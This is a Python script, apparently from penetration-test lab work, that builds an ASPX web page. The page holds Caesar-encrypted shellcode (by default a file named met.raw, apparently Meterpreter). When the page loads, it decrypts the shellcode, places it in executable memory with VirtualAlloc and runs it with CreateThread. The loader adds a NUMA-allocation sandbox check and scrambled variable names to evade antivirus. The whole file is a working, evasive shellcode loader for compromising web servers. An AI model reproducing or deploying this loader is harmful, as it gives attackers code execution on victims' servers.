from common.shellcode_formator import to_csharp_array
from common.encrypt_utils import EncryptUtils, Algorithm, Language
import sys


template = """
<%%@ Page Language="C#" AutoEventWireup="true" %%>
<%%@ Import Namespace="System.IO" %%>
<script runat="server">
    
private static Int32 MEM_COMMIT=0x1000;
private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;

[System.Runtime.InteropServices.DllImport("kernel32")]
private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);

[System.Runtime.InteropServices.DllImport("kernel32")]
private static extern IntPtr CreateThread(IntPtr lpThreadAttributes,UIntPtr dwStackSize,IntPtr lpStartAddress,IntPtr param,Int32 dwCreationFlags,ref IntPtr lpThreadId);

[System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

[System.Runtime.InteropServices.DllImport("kernel32.dll")]
private static extern IntPtr GetCurrentProcess();

static byte[] jInbWfhpOOw(byte[] enc, uint key)
{
%(decrypt_method)s
}

protected void Page_Load(object sender, EventArgs e)
{
IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
if(mem == null) return;
byte[] jSjkWk = %(encrypted_shellcode)s;
byte[] xQYQaf = jInbWfhpOOw(jSjkWk, %(decryption_key)s);
IntPtr ryiKs = VirtualAlloc(IntPtr.Zero,(UIntPtr)xQYQaf.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
System.Runtime.InteropServices.Marshal.Copy(xQYQaf,0,ryiKs,xQYQaf.Length);
IntPtr cIV = IntPtr.Zero;
IntPtr f74aotI3yzBn = CreateThread(IntPtr.Zero,UIntPtr.Zero,ryiKs,IntPtr.Zero,0,ref cIV);
}
</script>
"""


def get_code(shellcode_path, key):
    encryptor = EncryptUtils(Algorithm.CAESAR, key)
    with open(shellcode_path, 'rb') as f:
        encrypted_shellcode = encryptor.encrypt(f.read())
        output = template % {'decrypt_method': encryptor.get_decrypt_method(Language.CSHARP), 'encrypted_shellcode': to_csharp_array(encrypted_shellcode), 'decryption_key': str(key)}
        print(output)


shellcode_path = "/home/parallels/lab/clientside_exec/tmp/met.raw"
key = 7
if len(sys.argv) > 1:
    shellcode_path = sys.argv[1]
    if len(sys.argv) > 2:
        key = int(sys.argv[2])
get_code(shellcode_path, key)